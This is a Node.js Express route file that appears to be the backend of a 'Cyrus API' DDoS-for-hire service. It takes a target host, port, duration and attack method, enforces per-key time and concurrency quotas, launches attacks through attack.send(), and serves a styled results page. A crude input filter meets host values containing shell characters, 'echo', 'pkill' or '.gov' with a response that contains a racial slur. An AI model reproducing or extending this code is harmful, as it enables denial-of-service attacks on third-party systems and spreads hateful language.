const express = require("express");
const attack = require("../attack");
const fs = require("fs");
const fetch = require('node-fetch');
const router = express.Router();

router.get("/", async (req, res) => {
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;
    const key = req.query.key;

    const keyFile = fs.readFileSync("keys.json");
    let keyData = JSON.parse(keyFile);

    const methodFile = fs.readFileSync("methods.json");
    let methods = JSON.parse(methodFile);

    var g = "nigger Kamu DEK"
    try {
        parseInt(time);
    } catch (err) {
        return res.send("Time parameter must be an integer.");
    }

    if (host.includes("{")) {
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    if (host.includes("}")) {
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    if (host.includes("echo")) {
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    if (host.includes("pkill")) {
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    if (host.includes("%")) { 
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    if (host.includes(";")) {
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    if (host.includes(".gov")){
        res.writeHead(200, "OK")
        res.write("")
        res.end(g)
        console.clear()
    }
    
    try {
        parseInt(port);
    } catch (err) {
        return res.send("Port parameter must be an integer.");
    }

    if (!(host && port && time && method && key)) return await res.send(`"error": "Missing Parameters"`);
    if (!keyData[key]) return await res.send(`"error": "Invalid Key"`);
    if (!methods.includes(method.toUpperCase())) return await res.send(`"error": "That method doesnt exits"`);
    if (time > keyData[key]["time"]) return await res.send(`"error": "Max time reached"`);
    if (keyData[key].curCons >= keyData[key].maxCons) return await res.send(`"error": "Reached max Concurrents"`);
   /* const params = {
        username: "Cyrus",
        avatar_url: "",
        embeds: [
            {
                "title": "Cyrus Logs",
                "color": 15258703,
                "description": `**HOST:** ${host}\n**PORT:** ${port}\n**TIME:** ${time}\n**METHOD:** ${method}\n**KEY:** || ${key} ||`
            }
        ]
    }

    fetch("", {
        method: "POST",
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
    });
    */
    attack.send(host, port, time, method);

    keyData[key].curCons += 1;
    await fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {
        res.send(`
        <link rel = "icon" href ="https://media.discordapp.net/attachments/958571926824026115/961112014950916196/20220406_105525.png?width=427&height=427" type = "image/x-icon">
        <title>Cyrus API</title>
        <strong style=color:white;><center>WELCOME TO Cyrus API</center></strong></code></body></p>
        <strong style=color:white;><center>Cyrus API CREATE BY iSholved</center></strong></code></body></p>
        <strong style=color:white;><center>DISCORD : iSholved#6247</center></strong></code></body></p>
        <audio autoplay controls>
        <source src="https://cdn.discordapp.com/attachments/958571926824026115/961111715725049876/CoverOchame_Kinou_-_hololive_Indonesia_Generasi_2_Ver..mp3" type="audio/mpeg"><center></center>
        </audio>
  
    </body>

  <p>
        <body style=background-color:#000000;>
        <strong style=color:#317AB5;><center>Cyrus API</center></strong></code></body></p>
        </p><body><code> <strong style=color:white><center> Host:</strong> <strong style=color:#317AB5;>${host}</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Port:</strong> <strong style=color:#317AB5;>${port}</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Time:</strong> <strong style=color:#317AB5;>${time}</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Method:</strong> <strong style=color:#317AB5;>${method}</center></strong></code></body>      <br>      <body><code> <strong style=color:white><center> Servers:</strong> <strong style=color:#317AB5;>5</center></strong></code></body>`);
        console.log(`New Attack Logs With Key ${key} URL : ${host} Method: ${method}`)
        setTimeout(() => {
            keyData[key].curCons -= 1;
            fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {});
        }, parseInt(time) * 1000);
    });

});

module.exports = router;
